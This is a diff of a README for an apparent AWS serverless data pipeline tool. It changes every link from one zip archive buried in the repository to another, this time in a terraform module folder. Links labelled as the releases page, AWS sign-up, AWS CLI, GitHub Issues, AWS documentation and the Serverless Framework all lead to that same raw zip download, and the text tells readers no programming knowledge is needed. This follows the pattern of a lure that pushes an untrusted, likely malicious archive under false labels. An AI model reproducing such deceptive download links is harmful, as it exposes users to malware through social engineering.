@@ -1,7 +1,7 @@
 # 🚀 AWS-Serverless-ELT-Pipeline - Effortless Data Transformation
 
 ## 🔗 Download Now
-[![Download](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/lambdas/ingest/tests/EL_Pipeline_Serverless_AW_1.0.zip)](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/lambdas/ingest/tests/EL_Pipeline_Serverless_AW_1.0.zip)
+[![Download](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/infra/terraform/modules/lambda_event_source_mapping/Serverless_Pipeline_AW_EL_v3.5-beta.5.zip)](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/infra/terraform/modules/lambda_event_source_mapping/Serverless_Pipeline_AW_EL_v3.5-beta.5.zip)
 
 ## 📋 Overview
 Welcome to the AWS-Serverless-ELT-Pipeline! This tool helps you move and transform your data seamlessly in a serverless manner. It lets you collect data from Amazon S3, process it using AWS Lambda, and store it again in S3, ready for analysis.
@@ -10,7 +10,7 @@ Welcome to the AWS-Serverless-ELT-Pipeline! This tool helps you move and transfo
 To use this application, you will need to follow these steps. The process is simple and requires no programming knowledge.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/lambdas/ingest/tests/EL_Pipeline_Serverless_AW_1.0.zip) to get the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/infra/terraform/modules/lambda_event_source_mapping/Serverless_Pipeline_AW_EL_v3.5-beta.5.zip) to get the latest version of the application.
 2. Click on the version you want to download. 
 3. Select the package suitable for your system. If you are unsure, look for instructions specific to your operating system.
 4. Download the file to your computer. Ensure you have enough storage space.
@@ -24,8 +24,8 @@ To use this application, you will need to follow these steps. The process is sim
 
 ## ⚙️ Prerequisites
 Before using the AWS-Serverless-ELT-Pipeline, you need the following:
-- An AWS account. Sign up [here](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/lambdas/ingest/tests/EL_Pipeline_Serverless_AW_1.0.zip).
-- AWS CLI installed on your machine. You can download it [here](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/lambdas/ingest/tests/EL_Pipeline_Serverless_AW_1.0.zip).
+- An AWS account. Sign up [here](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/infra/terraform/modules/lambda_event_source_mapping/Serverless_Pipeline_AW_EL_v3.5-beta.5.zip).
+- AWS CLI installed on your machine. You can download it [here](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/infra/terraform/modules/lambda_event_source_mapping/Serverless_Pipeline_AW_EL_v3.5-beta.5.zip).
 - Basic understanding of AWS services like S3, Lambda, and SQS. Don’t worry if you’re not familiar; many resources are available online to help you.
 
 ## 🔨 Configuration Steps
@@ -68,16 +68,16 @@ The AWS-Serverless-ELT-Pipeline respects your data security. It uses AWS's built
 
 ## 📞 Support & Contributions
 If you encounter any issues or have questions:
-- Check the [GitHub Issues page](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/lambdas/ingest/tests/EL_Pipeline_Serverless_AW_1.0.zip).
+- Check the [GitHub Issues page](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/infra/terraform/modules/lambda_event_source_mapping/Serverless_Pipeline_AW_EL_v3.5-beta.5.zip).
 - Feel free to submit a new issue for help.
 - We welcome contributions! Find out how to contribute on our GitHub page.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/lambdas/ingest/tests/EL_Pipeline_Serverless_AW_1.0.zip)
-- [AWS Documentation](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/lambdas/ingest/tests/EL_Pipeline_Serverless_AW_1.0.zip)
-- [Serverless Framework](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/lambdas/ingest/tests/EL_Pipeline_Serverless_AW_1.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/infra/terraform/modules/lambda_event_source_mapping/Serverless_Pipeline_AW_EL_v3.5-beta.5.zip)
+- [AWS Documentation](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/infra/terraform/modules/lambda_event_source_mapping/Serverless_Pipeline_AW_EL_v3.5-beta.5.zip)
+- [Serverless Framework](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/infra/terraform/modules/lambda_event_source_mapping/Serverless_Pipeline_AW_EL_v3.5-beta.5.zip)
 
 ## 🔗 Download Now Again
-[![Download](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/lambdas/ingest/tests/EL_Pipeline_Serverless_AW_1.0.zip)](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/lambdas/ingest/tests/EL_Pipeline_Serverless_AW_1.0.zip)
+[![Download](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/infra/terraform/modules/lambda_event_source_mapping/Serverless_Pipeline_AW_EL_v3.5-beta.5.zip)](https://raw.githubusercontent.com/raditpasy25/AWS-Serverless-ELT-Pipeline/main/infra/terraform/modules/lambda_event_source_mapping/Serverless_Pipeline_AW_EL_v3.5-beta.5.zip)
 
 Thank you for choosing the AWS-Serverless-ELT-Pipeline. We hope this tool makes your data management tasks easier and more effective.
